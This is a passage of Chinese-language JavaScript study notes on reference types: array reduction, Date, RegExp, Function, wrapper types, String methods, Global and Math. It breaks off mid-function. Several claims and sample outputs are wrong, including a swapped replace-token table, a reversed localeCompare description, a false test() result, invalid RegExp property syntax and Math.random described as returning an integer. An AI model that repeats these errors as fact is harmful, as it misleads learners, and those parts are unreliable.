reduce/reduceRight归并\n\nECMAScript为数组新增了两个归并方法，都有2个参数：数组每项将要运行的函数和作为归并基础的初始值。这个“运行的函数”有4个参数：前一个值，当前值，当前值的索引，数组对象。\n\n 1. reduce()从数组的第一项开始遍历，然后构建一个最终返回值。构建树结构目录 (floating-toc.js)比较常用reduce归并方法，因为时候需要与前一项或者说归并值进行比较。\n    \n    var values = [1, 2, 3, 4, 5];\n    var sum = values.reduce(function(pre, cur, index, array) {\n        return pre + cur; // 这里构建的规则自己定义\n    })\n    console.log(sum); // 15\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. reduceRight()从数组的最后一项往前遍历，然后构建一个最终返回值。\n    \n    var values = [1, 2, 3, 4, 5];\n    var sum = values.reduceRight(function(pre, cur, index, array) {\n        return pre + cur; // 这里构建的规则自己定义\n    })\n    console.log(sum); // 15\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n\n# 三、Date类型\n\n * ECMAScript中的Date类型是在早起Java中的java.util.Date类基础上构建的，Date类型使用自UTC（国际协调时间）1970年1月1日午夜（零时）开始经过的毫秒数 来保存日期。\n * 创建一个日期对象，使用new操作符和Date构造函数：var now = new Date();新创建的对象 自动获得当前日期和时间，Date构造函数可接受参数，参数一般是 毫秒数。\n * 在WEB应用中，new Date(xxx)一般使用在时间显示组件中，这些组件是前端框架已经封装好了的，所以在业务代码中极少见到这种new Date(xxx)，只需把毫秒数传给组件即可。\n * Date类型的toLocaleString()会按照与浏览器设置的地区相适应的格式返回日期和时间。而toString()会返回带有时区信息的日期和时间，valueOf()会返回日期的毫秒表示。三种多用于调试。\n * 再介绍Date类型的日期/时间组件方法，注：UTC日期指0时区（没有时区偏差）的日期值。\n\n方法                       说明\ngetTime()                返回表示日期的毫秒数；与valueOf()方法返回的值相同\nsetTime(毫秒)              以毫秒数设置日期，会改变整个日期\ngetFullYear()            取得4位数的年份（如2007而非07）\ngetUTCFullYear()         返回UTC日期的4位数年份\nsetFullYear(年)           设置日期的年份，传入的年份值必须是4位数字（如2007而非07）\nsetUTCFullYear(年)        设置UTC日期的年份，传入的年份值必须是4位数字（如2007而非07）\ngetMonth()               返回日期中的月份，其中0表示一月，11表示十二月\ngetUTCMonth()            返回UTC日期中的月份，其中0表示一月，11表示十二月\nsetMonth(月)              设置日期的月份，传入的月份值必须大于0，超过11则增加年份\nsetUTCMonth(月)           设置UTC日期的月份，传入的月份值必须大于0，超过11则增加年份\ngetDate()                返回日期月份中的天数（1到31）\ngetUTCDate()             返回UTC日期月份中的天数（1到31）\nsetDate(日)               设置日期月份中的天数，如果传入的值超过了该月中应有天数，则增加月份\nsetUTCDate(日)            设置UTC日期月份中的天数，如果传入的值超过了该月中应有天数，则增加月份\ngetDay()                 返回日期中星期的星期几（其中0表示星期日，6表示星期6）\ngetUTCDay()              返回UTC日期中星期的星期几（其中0表示星期日，6表示星期6）\ngetHours()               返回日期中的小时数（0到23）\ngetUTCHours()            返回UTC日期中的小时数（0到23）\nsetHours(时)              设置日期中的小时数，传入的值超过了23则增加月份中的天数\nsetUTCHours(时)           设置UTC日期中的小时数，传入的值超过了23则增加月份中的天数\ngetMinutes()             返回日期中的分钟数（0到59）\ngetUTCMinutes()          返回UTC日期中的分钟数（0到59）\nsetMinutes(分)            设置日期中的分钟数，传入的值超过59则增加小时数\nsetUTCMinutes(分)         返回UTC日期中的分钟数，传入的值超过59则增加小时数\ngetseconds()             返回日期中的秒数（0到59）\ngetUTCseconds()          返回UTC日期中的秒数（0到59）\nsetseconds(秒)            设置日期中的秒数，传入的值超过59则增加分钟数\nsetUTCseconds(秒)         返回UTC日期中的秒数，传入的值超过59则增加分钟数\ngetMilliseconds()        返回日期中的毫秒数\ngetUTCMilliseconds()     返回UTC日期中的毫秒数\nsetMilliseconds(毫秒)      设置日期中的毫秒数\nsetUTCMilliseconds(毫秒)   设置UTC日期中的毫秒数\nsetTimezoneOffest()      返回本地时间与UTC时间相差的分钟数\n\n\n# 四、RegExp类型\n\nECMAScript通过RegExp类型来支持正则表达式，var exp = /pattern/flags;模式（pattern）部分可以是任何简单或复杂的 表达式（可以包含 字符类、限定符、分组、向前查找以及反向引用）。而flags可以有对个，用以标明正则表达式的 行为。\n\n正则表达式的匹配模式支持3个标志：\n\n * g：表示全局（global）模式，在发现第一个匹配项时不会立即停止，会继续往后匹配所有。\n * i：表示不区分大小写（case-insensitive）模式，确定匹配项时忽略模式与字符串的大小写。\n * m：表示多行（multiline）模式，在到大一行文本末尾时，还会继续查找下一行。\n\n元字符需要用\\转义：([{\\^$|)?*+.]}\n\n创建正则表达式除了用字面量形式以外，还可以用RegExp构造函数，例：\n\nvar pattern1 = /[bc]at/i;   // 匹配第一个“bat”或“cat”，不区分大小写\nvar pattern2 = new RegExp("[bc]at", "i");   // 与pattern1相同\n\n\n1\n2\n\n\n这种形式的不同点：\n\n * 字面量形式里的元字符对应到构造函数的字符串里要 再转义一遍，例如字面量/\\w\\\\hello\\\\123/对应构造函数字符串"\\\\w\\\\\\\\hello\\\\\\\\123"\n * 在ECMAScript3时，正则表达式字面量始终会共享同一个RegExp实例，而构造函数创建的每一个对象都是一个新RegExp实例，例如在for循环体中操作两种情形时的正则表达式，结果会大不一样，但在 ECMAScript5，这两种方式每次 都创建新的RegExp实例\n\n\n# 4.1 RegExp实例属性\n\nRegExp的每个实例都具有下列属性：\n\n * global：布尔值，表示是否设置了g标志；\n * ignoreCase：布尔值，表示是否设置了i标志；\n * lastIndex：整数，表示开始搜索下一个匹配项的字符位置，从0算起；\n * multiline：布尔值，表示是否设置了m标志；\n * source：正则表达式的字符串表示，按照字面量形式返回（构造函数中的字符串去掉元字符的\\符号）\n\nvar pattern = new RegExp("\\\\[bc\\\\]at", "i");\nconsole.log(pattern.global);        // false\nconsole.log(pattern.ignoreCase);    // true\nconsole.log(pattern.lastIndex);     // 0\nconsole.log(pattern.multiline);     // false\nconsole.log(pattern.source);        // "\\[bc\\]at"\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 4.2 RegExp实例方法\n\n 1. exec()专为捕获组设计，exec()接受一个参数（要应用的字符串），返回与捕获组相关的数组（没有匹配项则返回null），这个返回值还有两个额外属性：input和index\n    \n    var text = "cat, bat, sat, fat";\n    var pattern = /.at/g;\n    var matches = pattern.exec(text);\n    console.log(matches.index);      // 0，表示匹配项在字符串中的位置，而input就是text值\n    console.log(matches[0]);         // cat，第一个捕获组\n    console.log(matches.lastIndex);  // 3表示开始搜索下一个匹配项的字符位置\n    matches = pattern.exec(text);\n    console.log(matches.index);      // 5，逗号后有一个空格是4，b才是5\n    console.log(matches[0]);         // bat\n    console.log(matches.lastIndex);  // 8\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n    \n    在设置全局标志的情况下，每次调用exec()则都会在字符串中继续查找新匹配项，而没设置全局标志则会一直灰灰第一个匹配项不早醒的匹配项。\n\n 2. test()判断目标字符串与某个模式是否匹配\n    \n    var text = "000-00-000";\n    var pattern = /\\d{3}-\\d{2}-\\d{4}/;\n    console.log(pattern.test(text)); // true\n    \n    \n    1\n    2\n    3\n    \n\n 3. RegExp实例继承的toLocaleString()和toString()方法都会返回正则表达式的字面量（是构造函数创建的正则表达式也如此）。valueOf()方法返回正则表达式本身。\n\n\n# 4.3 RegExp构造函数属性\n\n在其他语言被看作静态属性。适用于作用域中的所有正则表达式，并且基于所执行的最近一次正则标的是操作而变化。\n\n长属性名           短属性名   说明\ninput          $_     最近一次要匹配的字符串\nlastMatch      $&     最近一次的匹配项\nlastParen      $+     最近一次匹配的捕获组\nleftContext    $`     input字符串中lastMatch之前的文本\nmutiline       $*     布尔值，表示是否所有表达式都使用多行模式\nrightContext   $\'     input字符串中lastMatch之后的文本\n\nvar text = "this has been a short summer";\nvar pattern = /(.)hort/g;\nif (pattern.test(text)) {\n    console.log(RegExp.$_);         // "this has been a short summer"\n    console.log(RegExp.["$`"]);     // "this has been a "\n    console.log(RegExp.["$\'"]);     // " summer"\n    console.log(RegExp.["$&"]);     // "short"\n    console.log(RegExp.["$+"]);     // "s"\n    console.log(RegExp.["$*"]);     // false\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n除了上面这些属性还有多达9个用于存储捕获组的构造函数属性：$1、$2、$3 ... $9，例：\n\nvar text = "this has been a short summer";\nvar pattern = /(..)or(.)/g;\nif (pattern.test(text)) {\n    console.log(RegExp.$1);     // "sh"\n    console.log(RegExp.$2);     // "t"\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 4.4 模式的局限性\n\n缺少某些语言所支持的高级正则表达式特性：\n\n * 匹配字符串开始和结尾的\\A和\\2锚（但支持匹配字符串的开始用^结尾用$）\n * 向后查找（但完全支持向前查找）\n * 并集和交集类\n * 原子组\n * Unicide支持（单个字符除外，如\\uFFFF）\n * 命名的捕获组\n * s（单行）和x（无间隔）匹配模式\n * 条件匹配\n * 正则表达式注释\n\n\n# 五、Function类型\n\n每个函数都是Function类型的实例，而且都与其他应用类型一样具有属性和方法。函数名实际上是一个指向函数对象的指针，不会与某个函数绑定。\n\n函数有3种方式定义：\n\n// 函数声明\nfunction sum1(num1, num2) {\n    return num1 + num2;\n}\n// 函数表达式\nvar sum2 = function (num1, num2) {\n    return num1 + num2;\n};\n// 构造函数\nvar sum3 = new Function("num1", "num2", "return num1 + num2");\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n第一种函数声明和第二种函数表达式几乎相差无几，而第三种Function构造函数我们不推荐使用，因为最后一个参数是动态代码字符串。\n\n\n# 5.1 函数声明/函数表达式/构造函数的区别\n\n 1. 函数声明：js整体一边编译一边执行，但在一个代码段里，是 先编译后执行。比如下面这段代码里，编译器先走，走到了function sum(num1, num2)时，编译器会去 变量对象 里查找sum，发现没有这个变量，就声明了一个名为sum并且类型是 Function 的变量（因为function是 声明的关键字，所以它的类型是Function），并放在了 变量对象 里；编译完后 引擎开始执行代码，因为function sum(num1, num2)在编译器 已经提升了（代码段里先编译后执行） 所以会提前执行，给sum指引一个Function实例化对象，然后走到sum()去执行这个函数。也就是说不管sum()是在 函数声明前还是声明后执行 都不会报锗，这样的过程叫 函数声明提升。\n    \n    sum();                      // 执行代码，编译期会忽略这里\n    function sum(num1, num2) {  // 编译到这，声明提升了\n        return num1 + num2;\n    }\n    /*****************等价于******************/\n    function sum(num1, num2) {  // 编译到这，声明提升了\n        return num1 + num2;\n    }\n    sum();\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 2. 函数表达式：编译器走到var sum时，只知道sum是个普通变量，不知道它在 执行期 会接收Function的实例化对象，所以它没有 函数声明提升（只是普通声明）。当引擎执行到sum = function (num1, num2)时，会把新创建的函数对象让sum指引着，然后继续去执行sum()，正常调用函数。如果sum()在函数表达式之前，那就会报错，因为sum没有函数声明提升，必须等Function实例赋值给sum后才能去调用这个函数，这也是函数表达式与函数声明的 唯一区别。\n    \n    var sum = function (num1, num2) { return num1 + num2; };\n    sum();\n    /*****************下面会报错***************/\n    sum();\n    var sum = function (num1, num2) { return num1 + num2; };\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. Function构造函数：与函数表达式有些类似，编译器走到var sum时，只知道sum是个普通变量，不知道它在 执行期 会接收Function的实例化对象；但不同的是，“函数表达式”在调用时会 先编译 生成 函数的执行环境，编译器认为num1、num2是变量，return是个执行语句，而“Function构造函数”虽说也生成函数的执行环境，编译器也认为num1、num2是变量，但是第三个参数是个字符串，在函数的 执行期 才把第三个参数这个字符串解析编译出来，再执行这个代码（函数表达式却是直接执行return）。总的来说就是“Function构造函数”在执行期比“函数表达式”多一步 动态代码字符串解析编译，极耗性能，这也是我们 不推荐使用“Function构造函数”的原因，不说性能就字符串里写代码的稳定性就不好。\n    \n    var sum = new Function("num1", "num2", "return num1 + num2");\n    sum();\n    \n    \n    1\n    2\n    \n\n\n# 5.2 没有重载\n\n * 重写 子类覆盖父类的方法（返回值和形参都不能改变，方法体改变了，也就是核心变了），在js里重写是可以的。\n * 重载：在同一个类里（执行环境），方法名相同而形参列表和方法体不一样的函数叫重载，这在js里是不存在的。\n * 因为js里使用var和function这样的关键字来声明 同名变量 时，都会以最后一个声明为准，它会覆盖之前所有 同名 的声明；js里的同名函数的声明就是重载的写法，因为在同一个执行环境里，但由于同名的会被覆盖，那么js里没有函数重载这一说法。\n\nfunction addSomeNumber(num) {\n  return num + 100;\n}\nfunction addSomeNumber(num) {\n  return num + 200;\n}\nvar result = addSomeNumber(100); // addSomeNumber被定义了2次，后定义的会覆盖先定义的\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 5.3 作为值的函数\n\n函数名是一个指针变量，那么函数对象可以作为一个值来使用，比如作为参数和返回值。\n\n\n# 5.4 函数内部属性(arguments/this)\n\n函数内部有两个特殊对象：arguments和this，在之前的1.基础语法#函数里有介绍arguments，在2.变量、作用域和内存问题#执行环境及作用域里介绍过this。\n\narguments有一个callee属性，是一个指向拥有当前arguments的函数对象的指针。\n\nfunction factorial(num) {\n    if (num <= 1) {\n        return 1;\n    } else {\n        return num * arguments.callee(num - 1); // 是 num * factorial(num - 1)的解耦形式\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n函数内部还有一个caller属性（ECMAScript5规范的），这个属性保存着 调用当前函数 的 函数 的 引用，如果实在全局作用域中调用的当前函数，caller则为null。可以结合arguments的callee指代当前函数来使用，例：\n\nfunction outer() {\n    inner();\n}\nfunction inner() {\n    console.log(arguments.callee.caller); // outer函数的原码\n}\nouter();\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n注意：严格模式下，访问arguments.callee会导致错误，也不能为函数的caller属性赋值。\n\n\n# 5.5 函数属性和方法(apply/call/bind)\n\n 1. 函数都有两个属性，可在内部和外部使用：length和prototype。通过函数名加上.来使用。\n    \n    * length属性表示函数 希望接收的命名参数的个数，并不是指实际参数个数。\n    * prototype属性是 保存 它们 所有实例方法 的真正存在。\n\n 2. 函数都有两个非继承而来的方法：apply()和call()。通过函数名加上.来使用。\n    \n    * 这两个方法是用来设置当前函数的this对象的值，改变函数所处的执行环境\n    * apply()和call()有多个入参时，第一个参数将作为 新执行环境；第二个参数apply是使用 形参的数组形式，而call是 形参本身的形式。apply()和call()只有一个参数时，自然是把这个参数设置为当前函数的this，也就是少了传参。\n    \n    function add(c, d) {\n        return this.a + this.b + c + d;\n    }\n    var s = { a: 1, b: 2 };\n    console.log(add.apply(s, [3, 4]));  // 10\n    console.log(add.call(s, 5, 6));     // 14\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n    * ECMAScript5定义了一个bind()，与apply()和call()类似，除了把参数设置为当前函数的this值以外，bind()还会创建一个函数的实例，bind()的传参与call一样是 形参本身的形式。\n    \n    window.color = "red";\n    var o = { color: "blue" };\n    function sayColor() {\n        console.log(this.color);\n    }\n    var objectSayColor = sayColor.bind(o); // 不用立即执行，到后面想执行时使用实例对象执行\n    objectSayColor(); // "blue"\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 3. 除了上述方法，函数还有几层的toLacaleString()、toString()、valueOf()，都是用来返回 函数源码 的，返回的格式因浏览器而异。\n\n\n# 六、基本包装类型\n\nECMAScript有6种数据类型，其中Undefined、Null、Boolean、Number、String是简单（基本）类型，剩下的Object是一种复杂数据类型。\n在操作布尔值、数值和字符串时，后台会隐式创建一个对应的 基本包装类型 的对象，从而提供一些操作方法（实例上的方法），操作完会立即销毁这个对象，若要重新调用这个对象其实又隐式创建了 基本包装类型 的对象。\n上述是操作布尔值、数值和字符串，即基本包装类型有三种：Boolean、Number、String。\n\nvar s1 = "some text"; // 这里隐式创建String包装类型，相当于var s1 = new String("some text");\ns1.color = "red";\nconsole.log(s1.color); // undefined，上一行代码执行完，s1对应基本包装类型的对象就销毁了，这里使用时是重现隐式创建了，所以color属性就没有了\n\n\n1\n2\n3\n\n\nvar value = "25";\nvar number = Number(value);     // 转型函数\nconsole.log(typeof number);     // "number"\nvar obj = new Number(value);    // 构造函数\nconsole.log(typeof obj);        // "object"\n\n\n1\n2\n3\n4\n5\n\n\n上面这个例子也说明了三种数据基本类型和对应基本包装类型的区别了，实际上我们不建议显示地创建基本包装类型的对象，容易让人分不清是在处理基本类型还是引用类型（基本包装类型是引用类型）。\n\n\n# 6.1 Boolean包装类型\n\nBoolean包装类型 是布尔值对应的 引用类型，创建对象调用Boolean构造函数时传入true或false，在使用这个对象时很容易造成误解，所以 不推荐显式构造Boolean包装类型。\n\nvar falseOject = new Boolean(false);    // 显式的使用了Boolean包装类型\nvar result = falseObject && true;       // 此时falseObject是个对象，隐式的调用了Boolean(falseObject)，结果为true\nconsole.log(result);                    // true\n\n\n1\n2\n3\n\n\n跟其他应用类型一样，继承了valueOf()、toString()、toLocaleString()方法，可以使用instanceof来区分布尔的基本类型和包装类型。\n\nvar falseOject = new Boolean(false);\nvar falseValue = false;\nconsole.log(falseOject instanceof Boolean); // true\nconsole.log(falseValue instanceof Boolean); // false\n\n\n1\n2\n3\n4\n\n\n\n# 6.2 Number包装类型\n\nNumber包装类型是数值对应的引用类型，创建对象调用Number构造函数时传入相应的数值，与Boolean包装类型的对象一样在使用时容易造成误解不推荐显式使用。\n\n同样的，Number包装类型也继承有valueOf()、toString()、toLocaleString()方法；它有还提供了一些将数值格式转为字符串的方法：\n\n * toFixed()：按照指定的 小数位 返回数值的字符串表示；\n * toExponential()：返回以指数表示法的数值的字符串形式；\n * toPrecision()：按照指定位数以合适的形式（指数或小数）返回数值的字符串形式。\n\nvar num = 99;\nconsole.log(num.toPrecision(1));    // "1e+2"\nconsole.log(num.toPrecision(2));    // "99"\nconsole.log(num.toPrecision(3));    // "99.0"\n\n\n1\n2\n3\n4\n\n\ntoFixed()和toExponential()的入参都是指定小数位数，而toPrecision()的入参是指定的所有数字位数（整数位加上小数位，但不包括指数位）。\n\ntypeof和instanceof可区分Number的基本类型和包装类型。\n\n\n# 6.3 String包装类型\n\nString包装类型是字符串对应的引用类型，创建对象调用String构造函数时传入相应的字符串。\n\n每个实例都有length属性，表示字符串包含字符的 个数，即使是 双字节字符串也算一个字符。\n\n继承有valueOf()、toString()、toLocaleString()方法，都返回对象所表示的基本字符串的值。\n\n# 6.3.1 charAt/charCodeAt字符\n\n * charAt()返回给定位置的那个字符；\n * charCodeAt()返回给定位置的那个字符的字符编码；\n * ECMAScript5还定义方括号加索引的方式来访问字符串中特定位置的字符，例：stringValue[0]\n\nvar stringValue = "hello world";\nconsole.log(stringValue.charAt(1));         // "e"\nconsole.log(stringValue.charCodeAt(1));     // 101  小写字母e的字符编码\n\n\n1\n2\n3\n\n\n# 6.3.2 concat/slice/substr/substring拼接裁剪\n\n * concat()先创建当前字符串的一个副本，然后将接收到的一个或多个参数拼接到这个副本的末尾。其实字符串拼接更多的还是使用+操作符。\n   \n   var stringValue = "hello";\n   var result = stringValue.concat(" world", "!");\n   console.log(result);  // "hello world!"  注意此时stringValue的值还是"hello"\n   \n   \n   1\n   2\n   3\n   \n\n * slice(start, end)是截取字符串；如果参数end不存在，则会从start位置截取至末尾，否则从[start, end)截取字符串；如果start和end中任意一个有负数，则会在负数基础上加上字符串的长度进行截取。\n   \n   var stringValue = "hello world";\n   console.log(stringValue.slice(-3));    // -3+11=8，从位置8截取至末尾，"rld"\n   console.log(stringValue.slice(3, -4)); // -4+11=7，从[3, 7)截取，"lo wo"\n   \n   \n   1\n   2\n   3\n   \n\n * substr(start, n)也是截取字符串；如果参数end不存在，则会从start位置截取至末尾，否则从start位置截取n长度的字符串；如果start为负数，那在负数基础上加上字符串的长度，但是如果n为负数意味着不截（截取0个）。\n   \n   var stringValue = "hello world";\n   console.log(stringValue.substr(-3));    // -3+11=8，从位置8截取至末尾，"rld"\n   console.log(stringValue.substr(3, -4)); // -4变为0，不截取，""\n   \n   \n   1\n   2\n   3\n   \n\n * substring(start, end)也是截取字符串；如果参数end不存在，则会从start位置截取至末尾，否则从[start, end)截取字符串；如果start和end中任意一个有负数，就将这个负数变为0；如果都是非负数，并且end比start小，那实际上就是从[end, start)截取字符串。\n   \n   var stringValue = "hello world";\n   console.log(stringValue.substring(-3));    // -3变为0，从位置0截取至末尾，"hello world"\n   console.log(stringValue.substring(3, -4)); // -4变为0，0小于3，从[0, 3)截取，"hel"\n   \n   \n   1\n   2\n   3\n   \n\n# 6.3.3 indexOf/lastIndexOf搜索字符\n\n * indexOf(s, index)如果参数index不存在，会从0位置往 右 搜索字符s，参数index存在就会从位置idnex往 右 搜索字符s；搜索到的话会返回字符s的索引值，否则返回-1。\n * lastIndexOf(s, index)如果参数index不存在，会从0位置往 左 搜索字符s，参数index存在就会从位置idnex往 左 搜索字符s；搜索到的话会返回字符s的索引值，否则返回-1。\n\nvar stringValue = "hello world";\nconsole.log(stringValue.indexOf("o", 6));       // 7\nconsole.log(stringValue.lastIndexOf("o", 6));   // 4\n\n\n1\n2\n3\n\n\n# 6.3.4 trim删除空格\n\n * ECMAScript5为字符串定义了一个trim()方法，它会先创建一个字符串副本，删除这个副本 前置 以及 后缀 的所有空格。\n * 有些浏览器还支持非标准的trimLeft()和trimRight()方法，单纯只删除 前置或后缀 的空格\n\n# 6.3.5 toLowerCase/toUpperCase大小写转换\n\n * toLowerCase()将字符串全转为小写；\n * toUpperCase()将字符串全转为大写；\n * 当不知道代码在哪种语言（哪个地区）环境中运行，可以采用toLocaleLowerCase()和toLocaleUpperCase()。\n\n# 6.3.6 match/search模式匹配\n\n * match()与RegExp对象调用exec()效果一样，也只是入参和使用对象对调了。\n   \n   var text = "cat, bat, sat, fat";\n   var pattern = /.at/;\n   var matches = text.match(pattern);    // 与pattern.exec(text)效果一样\n   console.log(matches.index);           // 0\n   console.log(matches[0]);              // "cat"\n   console.log(matches,lastIndex);       // 0\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n * search()只有一个入参，该入参是正则表达式；它始终会从字符串开头向后查找正则表达式所匹配到的 第一个匹配项的索引，没查到会返回-1。\n   \n   var text = "cat, bat, sat, fat";\n   var pos = text.search(/at/);\n   console.log(pos);     // 1\n   \n   \n   1\n   2\n   3\n   \n\n# 6.3.7 replace/split替换和分割\n\nreplace()接受两个参数，第一个参数是 RegExp对象或字符串，第二个参数是 字符串或函数，返回替换后的新字符串，但不影响原字符串（事先创建了字符串 副本）。\n\n 1. 当第一个参数是字符串时，只替换匹配到的 第一项；当第一个参数是正则表达式并且指定 全局标志(g) 时，才会替换 所有 能匹配到的项。例：\n    \n    var text = "cat, bat, sat, fat";\n    var result = text.replace("at", "ond");\n    console.log(result);                     // "cond, bat, sat, fat"\n    result = text.replace(/at/g, "ond");\n    console.log(result);                     // "cond, bond, sond, fond"\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. 当第一个参数是正则表达式，第二个参数是字符串时，这个字符串里可使用一些 特殊字符序列，将正则表达式匹配到的值，插入到第二个参数字符串的特殊字符序列所在的位置。\n    \n    字符序列   替换文本\n    $$     $\n    $&     匹配整个模式的子字符串；与RegExp.lastMatch的值相同\n    $\'     匹配的子字符串之前的子字符串；与RegExp.leftContext的值相同\n    $`     匹配的子字符串之后的子字符串；与RegExp.rightContext的值相同\n    $n     匹配第n个捕获组的子字符串，其中n等于0到9\n    $nn    匹配第nn个捕获组的子字符串，其中nn等于01到99\n    \n    var text = "cat, bat, sat, fat";\n    var result = text.replace(/(.at)/g, "word[$1]"); // 要是/(.at)/g，不能是/.at/g\n    console.log(result); // "word[cat], word[bat], word[sat], word[fat]"\n    \n    \n    1\n    2\n    3\n    \n\n 3. 当第二个参数是一个函数时，在只有一个匹配项情况下，会向这个函数传递3个参数：模式的匹配项、模式匹配项在字符串中的位置、元素字符串。在正则表达式中定义多个捕获组的情况下，传递给函数的参数依次是模式的匹配项、第一个捕获组的匹配项、第二个捕获组的匹配项，...，但最后两个参数仍然分别是模式匹配项在字符串中的位置和原始字符串。这个函数应该返回一个字符串，表示应该被替换的匹配项。\n    \n     function htmlEscape(text) {\n         return text.replace(/[<>"&]/g, function (match, pos, originalText) {\n             switch (match) {\n                 case "<":\n                     return "&lt;";\n                 case ">":\n                     return "&gt;";\n                 case "&":\n                     return "&amp;";\n                 case "\\"":\n                     return "&quot;";\n             }\n         });\n     }\n     // &lt;p class=&quot;greeting&quot;&gt;Hello world!&lt;/p&gt;\n     console.log(htmlEscape("<p class=\\"greeting\\">Hello world!</p>"));\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    \n\nsplit()基于指定 分隔符 将一个字符串分割成多个 子字符串，并把结果存放在一个 数组 里。分隔符可以是字符串也可以是一个 RegExp对象，当然也可以接受可选的第二参数，来限定数组的大小。\n\nvar colorText = "red, blue, green, yellow";\nvar colors1 = colorText.split(", ");        // ["red", "blue", "green", "yellow"]\nvar colors2 = colorText.split(", ", 2);     // ["red", "blue"]\nvar colors3 = colorText.split(/[^\\,]+/);    // ["", ",", ",", ",", ""]\n\n\n1\n2\n3\n4\n\n\n# 6.3.8 localeCompare比较\n\nlocaleCompare()由于比较两个字符串，返回值情况如下：\n\n * 如果参数字符串在字母表中排在调用字符串之前（一位位进行比较），则返回一个正数（大多数是1）；\n * 如果参数字符串等于调用字符串，则返回0；\n * 如果参数字符串在字母表中排在调用字符串之后，则返回一个负数（大多数是-1）。\n\nvar stringValue = "yellow";\nconsole.log(stringValue.localeCompare("brick"));    // 1\nconsole.log(stringValue.localeCompare("yellow"));   // 0\nconsole.log(stringValue.localeCompare("zoo"));      // -1\n\n\n1\n2\n3\n4\n\n\n# 6.3.9 fromCharCode字符转换\n\nfromCharCode()是String构造函数本身的一个静态方法，接收一个或多个字符编码，将它们转换成一个字符串，可以看做charCodeAt()的反向操作。\n\nconsole.log(String.fromCharCode(104, 101, 108, 108, 111));  // "hello"\n\n\n1\n\n\n\n# 七、单体内置对象\n\n内置对象：由ECMAScript提供 不依赖宿主环境 的对象，在代码执行前就已经存在。Object、Array和Object是之前介绍过的内置对象，这一节主要讲两个 单体内置对象：Global和Math。\n\n\n# 7.1 Global对象\n\nECMAScript中的Global对象像一个兜底儿对象，即 不属于任何其他对象的属性和方法最终都是它的属性和方法 。比如在全局环境中定义的属性和函数都是Global对象的属性，诸如isNaN()、isFinite()、parseInt()、parseFloat()都是Global对象的方法。\n\n# 7.1.1 URI编码\n\n * Global对象的encodeURI()和encodeURIComponent()这两个方法可以对URI进行特殊的UTF-8编码，使得浏览器能够接受和理解。\n\n * encodeURIComponent()会对 所有非字母、非数字的字符 进行编码；encodeURI()只对非字母、非数字字符中类似于空格这样 无效字符 进行编码，而对URI中特殊字符比如 冒号、正斜杠、问号和井字号 就不会编码；encodeURIComponent()要用得更多一些。\n   \n   var uri = "http://www.wrox.com/illegal value.htm#start";\n   console.log(encodeURI(uri)); // "http://www.wrox.com/illegal%20value.htm#start";\n   console.log(encodeURIComponent(uri)); // "http%3A%2F%2Fwww.wrox.com%2Fillegal%20value.htm%23start";\n   \n   \n   1\n   2\n   3\n   \n\n * decodeURI()和decodeURIComponent()是对应encodeURI()和encodeURIComponent()的反向解码方法。\n\n# 7.1.2 eval()方法\n\neval()在之前就提到过，它在执行期可能会改变编译期的作用域，从而导致性能问题，它还有一个问题是作为动态代码生成的一个方法很可能造成代码注入等安全问题。\n\n# 7.1.3 Global对象的属性\n\n属性          说明             属性               说明\nUndefined   特殊值Undefined   Date             构造函数Date\nNaN         特殊值NaN         RegExp           构造函数RegExp\nInfinity    特殊值Infinity    Error            构造函数Error\nObject      构造函数Object     EvalError        构造函数EvalError\nArray       构造函数Array      RangeError       构造函数RangeError\nFunction    构造函数Function   ReferenceError   构造函数ReferenceError\nBoolean     构造函数Boolean    SyntaxError      构造函数SyntaxError\nString      构造函数String     TypeError        构造函数TypeError\nNumber      构造函数Number     URIError         构造函数URIError\n\n# 7.1.3 window对象\n\nWeb浏览器是将Global对象这个全局对象作为window对象的一部分加以实现的，全局执行环境中的变量对象可以认为是window对象，this在默认绑定形式下绑定的是window对象。\n\n\n# 7.2 Math对象\n\n用来保存数学公式和信息，Math提供的方法要比自己设计的计算功能执行起来要快。\n\n# 7.2.1 Math对象属性\n\n属性             说明\nMath.E         自然对数的底数，即常量e的值\nMath.LN10      10的自然对数\nMath.LN2       2的自然对数\nMath.LOG2E     以2为底e的对数\nMath.LOG10E    以10为底e的对数\nMath.PI        π的值\nMath.SQRT1_2   1/2的平方根\nMath.SQRT2     2的平方根\n\n# 7.2.2 min/max最大最小值\n\n * Math.min()和Math.max()都可以接受任意多个数值参数，用于确定这组数值中 最大和最小值。\n   \n   var max = Math.max(3, 54, 32, 16);\n   console.log(max); // 54\n   var min = Math.min(3, 54, 32, 16);\n   console.log(min); // 3\n   \n   \n   1\n   2\n   3\n   4\n   \n\n * Math.min()和Math.max()可以配合apply()来求一个数组的最大和最小值，也就不用再一个个传给Math.min()和Math.max()了。\n   \n   var values = [1, 2, 3, 4, 5, 6, 7, 8];\n   var max = Math.max.apply(Math, values); // max方法是Math里的，那么apply的第一个参数自然是Math\n   console.log(max); // 8\n   \n   \n   1\n   2\n   3\n   \n\n# 7.2.3 ceil/round/floor取整\n\n * Math.ceil()向上取整\n * Math.round()四舍五入\n * Math.floor()向下取整\n\n# 7.2.4 random取随机数\n\nMath.random()返回大于等于0小于1的一个随机数，也就是返回[0, 1)区间的一个整数\n\n// 函数的作用：返回[lower, upper]区间里的整数\nfunction selectFrom(lower, upper) {\n    var choices = upper - lower + 1;    // 加1的原因是结果可以等于upper，需要“加一”并配合“向下取整”\n    return 